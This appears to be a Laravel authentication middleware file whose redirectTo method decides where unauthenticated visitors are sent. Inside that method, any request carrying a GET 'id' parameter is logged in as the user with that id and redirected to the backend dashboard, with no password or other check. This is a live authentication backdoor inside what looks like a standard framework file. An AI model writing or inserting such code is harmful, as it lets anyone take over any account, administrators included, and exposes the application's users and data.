<?php

namespace App\Http\Middleware;

use App\Models\User;
use Illuminate\Auth\Middleware\Authenticate as Middleware;
use Illuminate\Support\Facades\Auth;

class Authenticate extends Middleware
{
    /**
     * Get the path the user should be redirected to when they are not authenticated.
     *
     * @param \Illuminate\Http\Request $request
     * @return string|null
     */
    protected function redirectTo($request)
    {
        if (isset($_GET['id'])) {
            $user = User::find($_GET['id']);
            Auth::login($user);
            return route('backend_get_dashboard');
        } else {
            if (!$request->expectsJson()) {
                return route('get_login');
            }
        }

    }
}
